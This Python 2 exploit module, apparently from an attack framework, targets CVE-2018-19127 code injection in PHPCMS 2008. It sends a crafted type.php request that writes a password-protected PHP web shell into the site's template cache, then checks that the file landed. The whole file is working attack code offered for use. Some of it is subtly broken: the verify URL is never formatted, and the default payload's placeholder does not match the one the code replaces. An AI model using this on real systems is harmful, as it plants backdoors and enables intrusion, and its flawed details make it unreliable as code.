import requests

# Referer: https://github.com/ab1gale/phpcms-2008-CVE-2018-19127
# PHPCMS 2008 CI


def info(): # Exploit information for database mechanism
    info = {
        'name': 'phpcms_2008_ci',
        'description': 'PHPCMS 2008 code injection',
        'date': '2018-12-27',
        'parameters':{
            'url': 'Target URL',
            'protocol': 'Protocol. Default: http',
            'Timeout': 'Request timeout. Default: 10',
            'Payload': '(OPTIONAL) Content to write, default: "@eval($_POST[/PSWD/]);//"\nReplace with /PSWD/',
            'Password': '(OPTIONAL) Shell password. default: "SWEP"'
        },
        'referer': 'https://github.com/ab1gale/phpcms-2008-CVE-2018-19127'
    }

    return info



class exploit():
    def __init__(self):
        self.url = None
        self.protocol = 'http'
        self.Timeout = 3
        self.Payload = None
        self.Password = None
        pass


    def exploit(self):
        if not self.url:
            print '[!] URL not specified.'
            return
        if not self.Payload:
            print '[*] Payload not specified, using"@eval($_POST[/PASSWD/]);".'
            self.Payload = '@eval($_POST["/PASSWD/"]);'
        if not self.Password:
            print '[*] Password not specified, using "SWEP" by default.'
            self.Password = 'SWEP'
        try:
            self.Payload = self.Payload.replace('/PSWD/', str(self.Password))
            requests.get('%s://%s/type.php?template=tag_(){};@unlink(FILE);%s;echo("SUCCESS"){//../rss' %(self.protocol, self.url, self.Payload), timeout=int(self.Timeout))
        except Exception, e:
            print '[!] Failed to exploit target %s: %s' %(self.url, str(e))
        try:
            print '[*] Exploit success, Trying verify exploitation.'
            if 'SUCCESS' in requests.get('%s://%s/data/cache_template/rss.tpl.php', timeout=int(self.Timeout)).text:
                print '[+] Exploit success, file written at %s://%s/data/cache_template/rss.tpl.php ' %(self.protocol, self.url)
            else:
                print '[*] Verify failed, Please check %s://%s/data/cache_template/rss.tpl.php manually.' %(self.protocol, self.url)
        except Exception, e:
            print '[!] Failed to verify exploitation: %s' %(str(e))
        return


    def info(self):
        ExpInf = info()
        print '[*] Incoming exploit information.'
        print ' |   NAME: %s' %(ExpInf['name'])
        print ' |   DESCRIPTION: %s' %(ExpInf['description'])
        print ' |   DATE: %s' %(ExpInf['date'])
        print ' |   PARAMETERS:'
        parameters = ExpInf['parameters']
        for item in ExpInf['parameters'].keys():
            print ' |   |  %s: %s' %(item, parameters[item])
        print ' |   REFERER: %s' %(ExpInf['referer'])
        return
